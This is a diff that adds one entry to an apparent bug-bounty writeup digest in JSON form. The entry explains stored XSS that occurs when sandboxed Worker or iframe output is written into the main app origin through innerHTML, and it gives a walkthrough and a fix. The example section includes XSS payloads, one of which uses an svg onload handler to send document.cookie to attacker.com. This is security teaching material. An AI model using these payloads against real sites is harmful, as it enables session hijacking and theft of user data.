@@ -1,5 +1,46 @@
 [
   {
+    "id": "f4777b2c81b7",
+    "title": "When a ‘sandboxed’ result is painted back into the app origin",
+    "url": "https://medium.com/@adilburaksen/when-a-sandboxed-result-is-painted-back-into-the-app-origin-08866de6b3f7",
+    "source": {
+      "slug": "medium-tag-bug-bounty",
+      "name": "Medium — #bug-bounty"
+    },
+    "authors": [
+      "Adil Burak"
+    ],
+    "program": null,
+    "platform_slug": "self-disclosed",
+    "bounty_raw": null,
+    "published_at": "2026-11-26T13:25:36.000Z",
+    "added_at": "2026-11-26T14:13:57.188Z",
+    "categories": [
+      "xss",
+      "access-control"
+    ],
+    "severity": "high",
+    "difficulty": "intermediate",
+    "summary_en": "A vulnerability occurs when a sandboxed environment (like a Web Worker or iframe) generates HTML that is then unsafely inserted into the main application's document using innerHTML, bypassing sandbox restrictions.",
+    "summary_ar": null,
+    "lesson": {
+      "cause": "The application uses a Web Worker or sandboxed iframe to execute user-provided 'macros' or 'views' in isolation. While the execution environment is restricted, the application takes the resulting HTML string and passes it to an unsafe sink like innerHTML on the main origin (app.example.test). The browser's security model treats the string as trusted because it is being handled by the main application's code, effectively 'painting' the malicious content back into the sensitive origin where it can access cookies and user data.",
+      "walkthrough": "RECON\n1. Identify a feature where user-provided code or templates are executed, such as a 'macro' or 'custom view' system.\n2. Observe how the application handles this code using a Web Worker (a background script runner) or a sandboxed iframe (a restricted sub-window).\n\nDISCOVERY\n3. Locate the JavaScript code that initializes the worker.\nconst worker = new Worker(\"/macros/runner.js\", { type: \"module\" });\nWhy: This shows the app is trying to isolate the code execution (Worker: a background script that cannot touch the main page's document).\n4. Find the code that sends data to the worker.\nworker.postMessage({ source: record.macroSource, rows: record.rows });\nWhy: The app sends user-controlled 'macroSource' to the isolated environment (postMessage: a way to send data between different scripts).\n5. Find the listener that receives the result back from the worker.\nworker.onmessage = (event) => { const result = event.data; ... };\nWhy: This is the 'bridge' where the isolated data returns to the main application.\n\nEXPLOITATION\n6. Identify the 'sink' where the returned data is used.\npreview.innerHTML = result.html;\nWhy: The app uses innerHTML (a property that turns strings into live HTML elements) to render the worker's output. This is the flaw.\n7. Create a simple payload to test if the sandbox is bypassed.\nfunction renderStatus() { return { html: \"Status: <b>injected</b>\" }; }\nWhy: If the word 'injected' appears bold on the main page, it proves the HTML was parsed by the main origin, not the sandbox.\n8. Craft a malicious payload to execute JavaScript in the main origin.\nfunction exploit() { return { html: \"<img src=x onerror=alert(document.cookie)>\" }; }\nWhy: When the main page sets innerHTML to this string, the browser sees an image with a broken source and runs the 'onerror' script in the context of the main app.\n\nIMPACT\n9. Verify that the script has access to the main page's environment.\nalert(document.domain);\nWhy: This confirms the script is running on 'app.example.test' rather than a restricted sandbox origin.\n10. Observe that if this HTML is saved to a database, it becomes Stored XSS.\nWhy: Any user viewing the record later will trigger the malicious script when their browser renders the 'preview'.",
+      "example": "Suppose a site 'target.example' allows users to write custom CSS/HTML themes in a 'Theme Sandbox'. The sandbox runs in a separate iframe. \n\n// Vulnerable Parent Code\nwindow.onmessage = (e) => {\n  if (e.data.type === 'render') {\n    document.getElementById('theme-preview').innerHTML = e.data.html;\n  }\n};\n\nAn attacker sends a message from the sandbox (or tricks the app into saving a malicious theme):\nparent.postMessage({type: 'render', html: '<svg onload=fetch(\"https://attacker.com/log?c=\"+document.cookie)>'}, '*');\n\nWhy it works: Even though the sandbox itself couldn't read the parent's cookies, the parent 'trusted' the string it received and used innerHTML. The browser then executed the SVG's 'onload' script as if it were part of target.example, allowing the attacker to steal the user's session cookie.",
+      "takeaway": "Never assume that a string is 'safe' just because it was generated in a sandbox. A sandbox restricts the *process* of execution, but it does not 'stain' the resulting data with a security level. When hunting, look for postMessage listeners that take HTML strings and feed them into sinks like innerHTML, outerHTML, or jQuery's .html(). A key signal is any 'preview' or 'plugin' system that uses Workers or iframes but displays the final result in the main UI chrome.",
+      "fix": "The best fix is to keep the output inside a sandbox. Instead of copying the HTML string to the main document, use a sandboxed iframe with the 'srcdoc' attribute to display the result. If you must bring data into the main origin, do not use HTML; instead, pass a structured JSON object and build the UI using textContent, which treats all input as literal text and never executes scripts.\n\n// Fixed Code using textContent\nworker.onmessage = (event) => {\n  const { title } = event.data;\n  const el = document.createElement('div');\n  el.textContent = title; // Safe: <script> becomes literal text\n  document.body.appendChild(el);\n};",
+      "cause_ar": null,
+      "walkthrough_ar": null,
+      "example_ar": null,
+      "takeaway_ar": null,
+      "fix_ar": null
+    },
+    "excerpt": "The isolation only covers the place that produced the string. It does not travel with the string. If the parent application later takes that HTML and inserts it into its own document, the browser parses it in the application origin, with the user’s session and the rest of the page’s JavaScript. The sandbox never got a vote on the step that matters. This is a stored XSS problem wearing a sandbox label. I’ve reported the pattern; in the case I have in mind, it was fixed. I’m not writing about that product. The walk-through below uses a made-up app, Ledgerly, on `app.example.test`, so I can show",
+    "ai_generated": true,
+    "engagement": null,
+    "score": 53
+  },
+  {
     "id": "908b5a2d1a0a",
     "title": "Breach US Government site by only changing “false” to “true” state?",
     "url": "https://mxyuyu.medium.com/breach-us-government-site-by-only-changing-false-to-true-state-67d2662ab2a5",
